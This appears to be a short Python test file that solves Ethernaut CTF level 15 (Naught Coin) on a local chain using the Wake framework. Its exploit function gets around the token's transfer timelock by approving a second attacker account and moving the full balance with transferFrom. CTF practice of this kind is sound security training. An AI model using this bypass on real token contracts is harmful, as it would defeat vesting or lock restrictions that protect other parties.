from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv15_naught_coin import NaughtCoin


@default_chain.connect()
def test_lv15():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv15()
    exploit_lv15(contract, ethernaut.attacker)
    ethernaut.check_lv15(contract)

def exploit_lv15(contract: NaughtCoin, attacker: Account):
    another_account_of_attacker = default_chain.accounts[2]
    
    contract.approve(
        spender=another_account_of_attacker,
        value_=contract.balanceOf(attacker.address),
        from_=attacker
    )
    
    contract.transferFrom(
        attacker.address,
        another_account_of_attacker.address,
        contract.balanceOf(attacker.address),
        from_=another_account_of_attacker
    )


